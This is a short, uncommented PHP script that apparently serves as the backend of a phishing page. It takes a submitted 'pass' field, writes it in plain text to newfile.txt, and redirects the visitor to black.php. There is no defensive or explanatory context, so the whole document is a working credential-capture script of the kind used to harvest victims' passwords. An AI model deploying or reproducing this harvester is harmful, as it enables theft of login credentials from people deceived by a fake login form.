<?php

$myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
$txt = $_POST['pass'];
fwrite($myfile, $txt);
fclose($myfile);
header("Location: black.php");
